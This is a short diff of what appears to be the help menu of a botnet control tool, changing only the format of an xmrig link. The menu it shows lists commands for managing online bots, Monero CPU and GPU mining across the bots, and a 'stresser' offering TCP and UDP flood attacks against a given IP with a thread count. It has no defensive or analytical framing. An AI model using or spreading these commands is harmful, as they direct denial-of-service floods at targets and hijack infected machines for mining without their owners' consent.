@@ -6,7 +6,7 @@
 * help # Help menu
 * bots # Online bots
 * clear # Clear Terminal
-* miner pool:port monero_wallet worker_name # Monero CPU + GPU Mining (https://xmrig.com/wizard)
+* miner pool:port monero_wallet worker_name # Monero CPU + GPU Mining (xmrig.com/wizard)
 * methods # Stresser menu
 * tcp ip port threads # TCP Attack [Do not write http(s)]
 * udp ip threads # UDP Attack [Do not write http(s)]
